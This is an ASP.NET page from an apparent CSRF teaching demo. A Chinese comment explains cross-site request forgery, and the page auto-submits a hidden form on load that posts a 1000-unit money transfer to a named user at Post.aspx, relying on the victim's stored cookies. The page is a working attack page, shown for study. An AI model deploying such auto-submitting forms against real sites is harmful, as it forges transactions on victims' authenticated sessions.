<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="SCRF_Post.aspx.cs" Inherits="CSRFDemo.SCRF_Post" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title></title>
</head>
<body onload="document.getElementById('form1').submit()">

    <p>
        这个页面用来伪造数据提交表单,因为A网站之前访问后，存留cookie，我们直接在B网站，构建一个表单提交。也会成功
        也叫跨站请求伪造 CSRF
    </p>
    <form id="form1" method="post" action="Post.aspx" style="display: none;">
        <div>
            用户名：<input type="text" name="username" value="mas" /><br />
            金额：<input type="text" name="money" value="1000" /><br />
            <input type="submit" value="转账" />
        </div>
    </form>
</body>
</html>
